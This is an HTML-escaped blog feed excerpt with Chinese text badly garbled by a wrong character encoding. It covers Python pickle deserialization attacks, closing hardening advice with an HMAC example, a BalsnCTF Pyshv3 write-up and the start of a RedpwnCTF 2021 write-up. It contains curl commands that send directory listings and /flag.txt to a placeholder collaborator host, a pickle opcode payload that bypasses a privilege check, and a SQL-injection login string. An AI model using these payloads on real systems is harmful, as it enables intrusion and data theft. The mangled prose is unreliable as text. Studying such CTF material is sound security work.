&lt;h2 id="ä¸€äº›å°æŠ€å·§æ³¨æ„äº‹é¡¹">ä¸€äº›å°æŠ€å·§&amp;amp;æ³¨æ„äº‹é¡¹&lt;/h2>
&lt;ul>
&lt;li>å½“æŠŠpayloadä½œä¸ºgetå‚æ•°è¯·æ±‚æ—¶ï¼Œurlç¼–ç æ³¨æ„æ¢è¡Œç¬¦æ˜¯%0Aè€Œä¸æ˜¯%0D%0A&lt;/li>
&lt;li>å¯¹payloadè¿›è¡Œb64åŠ å¯†æ—¶ï¼Œæ³¨æ„åˆ«æŠŠ\nç»™å•ç‹¬ç¼–ç äº†ï¼ˆä¸è¿‡æ­£å¸¸éƒ½ä¸ä¼šï¼‰&lt;/li>
&lt;li>å…¶ä»–æ¨¡å—çš„loadä¹Ÿå¯ä»¥è§¦å‘pickleååºåˆ—åŒ–æ¼æ´&lt;/li>
&lt;/ul>
&lt;p>ä¾‹å¦‚ï¼š&lt;code>numpy.load()&lt;/code>å…ˆå°è¯•ä»¥numpyè‡ªå·±çš„æ•°æ®æ ¼å¼å¯¼å…¥ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™å°è¯•ä»¥pickleçš„æ ¼å¼å¯¼å…¥ï¼›&lt;code>pandas.read_pickle()&lt;/code>ç›´æ¥ä½¿ç”¨&lt;code>pickle.load()&lt;/code>æ–¹æ³•&lt;/p>
&lt;ul>
&lt;li>çµæ´»è¿ç”¨&lt;u>&lt;strong>burp collaborator&lt;/strong>&lt;/u>&lt;/li>
&lt;/ul>
&lt;p>è™½ç„¶æˆ‘ä»¬ä¸èƒ½æŠŠburpæä¾›çš„collaboratorå½“ä½œvpsæ¥ä½¿ç”¨ï¼Œè¿›è¡Œåå¼¹shellç„¶åä¸€é€šæ“ä½œï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå¼•å·+curlçš„æ–¹å¼ç›´æ¥è·å¾—ä»£ç æ‰§è¡Œå’Œç»“æœçš„è¾“å‡ºï¼›curlæœ¬èº«çš„ç”¨æ³•ä¹Ÿå¾ˆå¤šï¼Œå¯ä»¥ç›´æ¥å¸¦æ–‡ä»¶è¿›è¡Œpostï¼Œæ›´å¤šå†…å®¹å‚è§ï¼š&lt;a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl çš„ç”¨æ³•æŒ‡å—&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># åŸºæ“1&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`)&lt;/span>
&lt;span style="color:#75715e"># åŸºæ“2 -då‚æ•°å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹ä½œä¸ºæ•°æ®ä½“å‘é€ï¼Œä¼šè‡ªåŠ¨æ·»åŠ è¯·æ±‚å¤´å¹¶è°ƒæ•´è¯·æ±‚æ–¹æ³• æ— éœ€-X POST&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl -d &amp;#39;&lt;/span>&lt;span style="color:#f92672">@/&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39; http://xxxx.burpcollaborator.net/)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="æœ€åå‡ºäºå®‰å…¨è§’åº¦çš„è€ƒé‡">æœ€åï¼Œå‡ºäºå®‰å…¨è§’åº¦çš„è€ƒé‡&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ç¦ç”¨pickleï¼Œä½¿ç”¨Jsonæˆ–Google Protocol Buffers&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å½“ç¡®å®éœ€è¦ä½¿ç”¨pickleæ—¶ï¼Œè¦ç¡®ä¿å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚é‡å†™&lt;code>find_class()&lt;/code>ï¼ˆä½¿ç”¨ç™½åå•è€Œä¸æ˜¯é»‘åå•è¿›è¡Œè¿‡æ»¤ï¼‰ã€ç¦æ­¢æŸäº›æ“ä½œç¬¦ï¼›ç”±äºåœ¨å¯¹opcodeè¿›è¡Œååºåˆ—åŒ–æ—¶å¯èƒ½ä¼šé€ æˆä»»æ„æ–‡ä»¶è¯»å†™ï¼Œä¸€å®šæå‰å¯¹é‡è¦æ–‡ä»¶åšå¥½æƒé™çš„ç®¡ç†ï¼›å¿…è¦æ—¶å¯ä»¥å¯¹ä¿¡æ¯è¿›è¡Œhmacç­¾å&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸¾ä¸€ä¸ªhmacçš„æ —å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hmac&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__str__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;My name is &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">, I am &lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200"> years old.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HMAC_Pickler&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">seperator&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">signer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hmac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">):]&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Data is tampered by someone.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s%s%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sign&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f&amp;#39;&lt;/span>
&lt;span style="color:#111">pickler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HMAC_Pickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Jack&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;I am hacker, trying evil things&amp;#34;&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­9 - [BalsnCTF 2019] Pyshv3
&lt;/h4>
&lt;/summary>
&lt;p>è¿™æ¬¡çš„find_class()æ²¡æœ‰å˜åŒ–ï¼Œä½†æ˜¯structsæœ‰å…·ä½“çš„å®ç°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812012841569.png" alt="image-20210812012841569">&lt;/p>
&lt;p>åŒæ—¶server.pyçš„é€»è¾‘ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ï¼Œä¸ç”¨rceäº†ï¼Œç›´æ¥æœ‰ä¸€ä¸ªæ‹¿flagçš„å‡½æ•°ï¼Œä½†éœ€è¦self.user.privilegedä¸ºTrueæ‰å¯ä»¥è¿”å›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013032487.png" alt="image-20210812013032487">&lt;/p>
&lt;p>è€Œè¿™ä¸ªself.user.privilegedåœ¨ä¸€å¼€å§‹å°±è¢«è®¾ä¸ºäº†False&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013115089.png" alt="image-20210812013115089">&lt;/p>
&lt;p>emmmm è¿™æ€ä¹ˆç»•è¿‡æï¼Ÿ&lt;/p>
&lt;p>å…ˆè¯´éé¢„æœŸï¼Œå°†&lt;code>__builtins__&lt;/code>å¤åˆ¶åˆ°moduleså±æ€§ä¸Šï¼›å†è¯´è¯´é¢„æœŸè§£ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬çŸ¥é“ï¼Œæœ‰&lt;code>__get__&lt;/code>ï¼Œ&lt;code>__set__&lt;/code>è¿™æ ·æè¿°å™¨åè®®æ–¹æ³•çš„å¯¹è±¡ç§°ä¸ºæè¿°å™¨descriptorã€‚é»˜è®¤å¯¹å±æ€§çš„è®¿é—®æ§åˆ¶éƒ½æ˜¯ä»å¯¹è±¡çš„å­—å…¸__dict__é‡Œé¢è¿›è¡Œè·å–(get)ï¼Œè®¾ç½®(set)å’Œåˆ é™¤(delete)çš„æ–¹æ³•ï¼ˆå‰é¢çš„é‚£é“é¢˜ä¹Ÿç”¨åˆ°è¿™ä¸ªç‚¹ï¼‰ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œ&lt;code>a.x&lt;/code>çš„æŸ¥æ‰¾é¡ºåºæ˜¯&lt;code>a.__dict__['x']&lt;/code>ï¼Œä¹‹å&lt;code>type(a).__dict__['x']&lt;/code>ï¼Œç„¶åæ‰¾type(a)çš„çˆ¶ç±»ã€‚å¦‚æœæŸ¥æ‰¾åˆ°çš„å€¼æ˜¯ä¸€ä¸ªæè¿°å™¨ï¼Œpythonå°±ä¼šè°ƒç”¨æè¿°å™¨çš„æ–¹æ³•æ¥é‡å†™é»˜è®¤çš„æ§åˆ¶è¡Œä¸ºï¼Œè¿™ä¸ªé‡å†™å‘ç”Ÿåœ¨è¿™ä¸ªæŸ¥æ‰¾ç¯èŠ‚çš„å“ªé‡Œå–å†³äºå®šä¹‰äº†å“ªä¸ªæè¿°å™¨æ–¹æ³•ã€‚ï¼ˆæ³¨æ„ï¼šåªæœ‰åœ¨æ–°å¼ç±»ä¸­æ—¶æè¿°å™¨æ‰èµ·ä½œç”¨ï¼‰ï¼ˆæ›´å¤šä»‹ç»å‚è§ï¼š&lt;a href="https://foofish.net/what-is-descriptor-in-python.html">ä»€ä¹ˆæ˜¯æè¿°ç¬¦ï¼ˆdescriptorï¼‰&lt;/a>ï¼‰&lt;/p>
&lt;p>æˆ‘ä»¬åˆ©ç”¨æè¿°å™¨çš„ç‰¹æ€§ï¼Œå°†Userç±»çš„&lt;code>__set__&lt;/code>æ–¹æ³•é‡è½½ä¸ºstructs.Userï¼Œå¹¶æŠŠå®ƒçš„privilegedå±æ€§èµ‹å€¼ä¸ºä¸€ä¸ªUserå®ä¾‹ã€‚å½“è¿›è¡Œself.user.privilegedè¢«èµ‹å€¼æ—¶è§¦å‘&lt;code>__set__&lt;/code>ï¼Œä½†ç”±äºå·²ç»è¢«é‡å†™ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«èµ‹å€¼Falseï¼Œè€Œæ˜¯ä¿æŒåŸæ ·ï¼Œè¿˜æ˜¯ä¸€ä¸ªUserå®ä¾‹ã€‚åœ¨åé¢ifåˆ¤æ–­æ—¶ï¼ŒUserå®ä¾‹å½“ç„¶æ˜¯Trueï¼Œå°±å¯ä»¥ç»•è¿‡äº†ã€‚&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__set__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">privileged&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\nUser\np0\n0g0\n(}(S'__set__'\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S'privileged'\ng2\ndtbg2\n.&amp;quot;
&lt;/code>&lt;/pre>&lt;/details>
&lt;p>è€ƒè™‘åˆ°è¿™ä¸ªé¢˜æ›´ç»¼åˆäº†pythonçš„ç›¸å…³ç‰¹æ€§ï¼Œæ‰€ä»¥æŠŠè¿™ä¸ªé¢˜æ”¾åœ¨æœ€åã€‚&lt;/p>
&lt;hr>
&lt;p>ä»æ–°å»ºæ–‡ä»¶åˆ°å†™å®Œç”¨äº†å‡ å¤©æ—¶é—´ï¼Œç»†ç»†åœ°æ•´ç†ç›¸å…³çŸ¥è¯†ï¼Œä¹Ÿç®—æ˜¯å¯¹ååºåˆ—åŒ–è¿™ä¸ªçŸ¥è¯†ç‚¹çš„è®¤è¯†æ¸…æ™°äº†ä¸å°‘ã€‚è¿˜æœ‰ä¸€ä¸ªPyYAMLçš„ååºåˆ—åŒ–é—®é¢˜ï¼Œç”±äºç¯‡å¹…é—®é¢˜æ‹†å¼€æ¥æ”¾åˆ°ä¸‹ä¸€ç¯‡ä¸­ã€‚è‡ªè®¤ä¸ºæ€»ç»“çš„è¿˜æ˜¯æ¯”è¾ƒè¯¦ç»†çš„ï¼ˆå˜¿å˜¿xï¼‰ä¸è¿‡è‚¯å®šè¿˜æœ‰ä¸å‘¨åˆ°çš„åœ°æ–¹ï¼Œä¹‹åå¦‚é‡åˆ°æ›´å¤šçŸ¥è¯†è¿˜ä¼šè¿›è¡Œè¡¥å……ã€‚&lt;/p>
&lt;p>è‡ªå·±è¿˜æ˜¯æœ‰æƒ°æ€§å•Šï¼Œå…¶å®ååºåˆ—åŒ–ç¬¬ä¸€ç¯‡æ€»ç»“çš„æ˜¯phpï¼Œå¯æ˜¯åˆ°ç°åœ¨è¿˜æœ‰å‡ ä¸ªäºŒçº§æ ‡é¢˜ä¸‹é¢æ˜¯ç©ºç™½çš„â€¦â€¦åªèƒ½å…ˆç»™è‡ªå·±æ‰¾ä¸ªå€Ÿå£ï¼šphpååºåˆ—åŒ–çš„ä¸œè¥¿å®åœ¨æ˜¯å¤ªå¤šäº†TAT&lt;/p>
&lt;hr>
&lt;p>æœ€åæ”¾ä¸€ä¸‹å…¨ç¯‡ç”¨åˆ°çš„çš„å‚è€ƒæ–‡ç« ï¼ˆéƒ¨åˆ†å·²å†™åœ¨å¯¹åº”æ ‡é¢˜ä¸‹é¢ï¼‰ï¼Œä¸åˆ†å…ˆå~&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/wjrblogs/p/14057784.html">Python ååºåˆ—åŒ–æ¼æ´å­¦ä¹ ç¬”è®°&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ Python ååºåˆ—åŒ–æ¼æ´&lt;/a> | &lt;a href="https://xz.aliyun.com/t/7436#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2">pickleååºåˆ—åŒ–åˆæ¢&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188981#h2-10">Python pickle ååºåˆ—åŒ–å®ä¾‹åˆ†æ&lt;/a> | &lt;a href="https://segmentfault.com/a/1190000013099825">Python ååºåˆ—åŒ–å®‰å…¨é—®é¢˜ï¼ˆä¸€ï¼‰&lt;/a> - &lt;a href="https://segmentfault.com/a/1190000013214956">Python ååºåˆ—åŒ–å®‰å…¨é—®é¢˜ï¼ˆäºŒï¼‰&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/89132768">ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ &amp;amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿&lt;/a> | &lt;a href="https://blog.csdn.net/weixin_39929635/article/details/111003485">å…³äºPython secçš„ä¸€äº›ç®€å•çš„æ€»ç»“&lt;/a> | &lt;a href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">Sour Pickles A serialised exploitation guide in one part - Macro Slaviero&lt;/a> | &lt;a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#">ğŸ Security Issues in Python Pickle&lt;/a>&lt;/p></description></item><item><title>RedpwnCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/</link><pubDate>Sun, 08 Aug 2021 20:08:39 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/</guid><description>&lt;p>å®˜æ–¹çš„dockeråœ°å€~~å¤ç°ä¸€æœ¬æ»¡è¶³~&lt;a href="https://github.com/redpwn/redpwnctf-2021-challenges">https://github.com/redpwn/redpwnctf-2021-challenges&lt;/a>&lt;/p>
&lt;h2 id="webinspect-me">web/inspect-me&lt;/h2>
&lt;blockquote>
&lt;p>See if you can find the flag in the source code!&lt;/p>
&lt;p>&lt;a href="https://inspect-me.mc.ax/">inspect-me.mc.ax&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092212510.png" alt="image-20210710092212510">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092254315.png" alt="image-20210710092254315">&lt;/p>
&lt;h2 id="weborm-bad">web/orm-bad&lt;/h2>
&lt;blockquote>
&lt;p>I just learned about orms today! They seem kinda difficult to implement though&amp;hellip; Guess I&amp;rsquo;ll stick to good old raw sql statements!&lt;/p>
&lt;p>&lt;a href="https://orm-bad.mc.ax/">orm-bad.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/eb4c66c15fe3013340068ef0a34bd5dd5c0c98c567fac53b158d56afe07b511c/app.js">app.js&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ä¸‡èƒ½å¯†ç ï¼šadmin&amp;rsquo;or'1 : admin&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092643161.png" alt="image-20210710092643161">&lt;/p>
